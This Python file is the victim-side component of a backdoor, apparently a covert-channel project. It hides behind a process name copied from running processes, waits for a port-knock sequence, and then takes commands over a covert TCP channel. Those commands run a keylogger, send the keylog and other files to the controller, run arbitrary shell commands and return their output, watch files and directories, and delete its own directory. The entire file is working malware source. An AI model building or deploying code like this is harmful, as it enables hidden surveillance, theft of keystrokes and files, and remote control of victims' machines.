import argparse
import psutil as psutil
from keylogger import *
from watcher import *


def analyze_existing_process_names():
    processes = psutil.process_iter(attrs=['pid', 'name'])
    process_names = [p.info['name'] for p in processes]
    custom_name = random.choice(process_names) + "_custom_" + str(random.randint(1000, 9999))
    return custom_name


def change_program_name():
    existing_process_names = [p.name() for p in psutil.process_iter()]
    if existing_process_names:
        chosen_name = analyze_existing_process_names()
    else:
        chosen_name = "nvme-update-wq"
    return chosen_name


def port_knocking():
    ip_dict = {}
    while True:
        pkt = AsyncSniffer(filter=f"tcp", lfilter=lambda x: x[TCP].flags & 2)
        pkt.start()
        time.sleep(0.06)
        pkt.stop()
        if pkt.results:
            for i in pkt.results:
                if i.dport == 100:
                    ip_dict[i[IP].src] = [i.time]
                elif i.dport == 200:
                    try:
                        if i.time - ip_dict[i[IP].src][0] < 5:
                            ip_dict[i[IP].src].append(i.time)
                        else:
                            ip_dict.pop(i[IP].src)
                    except KeyError:
                        continue
                elif i.dport == 300:
                    try:
                        if i.time - ip_dict[i[IP].src][1] < 5:
                            print(f"Port Knock Success: {i[IP].src, i.sport}")
                            return i[IP].src, i.sport
                        else:
                            ip_dict.pop(i[IP].src)
                    except KeyError:
                        continue
        f_dict = {key: value for key, value in ip_dict.items() if time.time()-value[-1] < 5}
        ip_dict = f_dict


def command_processor(command: int, keylogger, watcher, covert):
    if command == 0:
        return 0
    print(f"[COMMAND RECEIVED]", end=" ")

    if command == 1:
        print("Start Keylogger")
        keylogger.start_keylogger()
        return 1

    elif command == 2:
        print("Stop Keylogger")
        if not keylogger.get_status():
            print("Keylogger not running")
            return 2
        val = keylogger.stop_keylogger()
        if val == 0:
            print(f'Keylogger Stopped')
        return 2

    elif command == 3:
        print("Transfer Keylog File")
        i = keylogger.get_status()
        if i:
            covert.cmd = 1
            covert.send_data(False)
            covert.cmd = None
            print("[TRANSFER STOPPED] Keylogger running")
            return 3
        elif not os.path.exists('keylog.txt'):
            covert.cmd = 2
            covert.send_data(False)
            covert.cmd = None
            print("[TRANSFER STOPPED] keylog.txt does not exist")
            return 3

        covert.cmd = 0
        covert.send_data(is_victim=False)
        covert.cmd = None

        covert.file_name = "keylog.txt"
        covert.send_data(is_victim=False, event="IN_CREATE")
        covert.file_name = None
        os.remove("keylog.txt")

    elif command == 4:
        print(f"Transfer File To")
        sig = int(covert.receive_data(is_victim=True))
        if not sig:
            print(f"[ERROR: File does not exist] wrong file path")
        else:
            print('Receiving')
            covert.receive_data(is_victim=True)

    elif command == 5:
        print(f"Transfer File From", end=": ")
        file = covert.receive_data(is_victim=True)
        i = check_exists(file)
        if not i:
            covert.cmd = 0
            covert.send_data(is_victim=False)
            covert.cmd = None
        covert.cmd = 1
        covert.send_data(is_victim=False)
        covert.cmd = None
        covert.file_name = file
        covert.send_data(is_victim=False, event="IN_CREATE")
        covert.file_name = None

    elif command == 6:
        print(f"Run Program")
        program_name = covert.receive_data(is_victim=True)
        try:
            output = subprocess.check_output(program_name, shell=True, universal_newlines=True)
        except subprocess.CalledProcessError as e:
            print(f"Error: {e}")
            covert.cmd = 0
        else:
            if output:
                covert.cmd = output
            else:
                covert.cmd = 1
        finally:
            covert.send_data(is_victim=False)

    elif command == 7:
        print(f"Watch File", end=": ")
        file = covert.receive_data(is_victim=True)
        i = check_exists(file)
        if not i or watcher.get_status():
            covert.cmd = 0
            covert.send_data(is_victim=False)
            covert.cmd = None
            if not watcher.init_watcher():
                print("Watcher already running")
                return 7
            elif not i:
                print("Error File path")
                return 7
        covert.cmd = 1
        covert.send_data(is_victim=False)
        covert.cmd = None
        watcher.toggle_file()
        watcher.start_watching(covert, file)
        return 7

    elif command == 8:
        print(watcher)
        print("Watch Directory", end=": ")
        direc = covert.receive_data(is_victim=True)
        print(direc)
        i = check_exists(direc)
        if not i or watcher.get_status():
            if not watcher.init_watcher():
                print("Watcher already running")
                covert.cmd = 0
                covert.send_data(is_victim=False)
                covert.cmd = None
                return 8
            elif not i:
                print("Error directory path")
                covert.cmd = 0
                covert.send_data(is_victim=False)
                covert.cmd = None
                return 8
        covert.cmd = 1
        covert.send_data(is_victim=False)
        covert.cmd = None
        watcher.toggle_dir()
        watcher.start_watching(covert, direc)
        return 8

    elif command == 9:
        print("Stop Watching File")
        if not watcher.get_status():
            print("Not Watching a File")
            return 9
        watcher.stop_watching()
        print(watcher)
        return 9

    elif command == 10:
        if not watcher.get_status():
            print("Not Watching a Directory")
            return 10
        val = watcher.stop_watching()
        if val == 0:
            print(f'Stopped watching the directory')
        return 10

    elif command == 11:
        print("Disconnect")
        return 11

    elif command == 12:
        print("Uninstall")
        current_directory = os.getcwd()
        shutil.rmtree(current_directory)
        exit()
        return 12

    else:
        print("[COMMAND] ERROR")
        return 13


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-p', '--port', type=int, dest='port', default=66)
    args = parser.parse_args()
    change_program_name()
    keylogger_instance = Keylogger()
    watcher_instance = Watcher()
    victim_ip = get_ip_address()
    victim_port = args.port
    while True:
        print(f"\n---[STANDING BY FOR PORT KNOCK]---")
        cmd_ip, cmd_port = port_knocking()
        covert_instance = CovertTCP(victim_addr=victim_ip, victim_port=victim_port, cmd_addr=cmd_ip,
                                    cmd_port=cmd_port)
        covert_instance.key = bytes(input("Enter Encryption Key: "), 'ascii')
        while True:
            try:
                print(f"[MAIN] waiting on command")
                command = int(covert_instance.receive_data(is_victim=True))
            except KeyboardInterrupt as e:
                print(f"{e}")
            else:
                result = command_processor(command, keylogger_instance, watcher_instance, covert_instance)
                if result == 11:
                    print(f"[DISCONNECTING]\n")
                    break


if __name__ == "__main__":
    main()
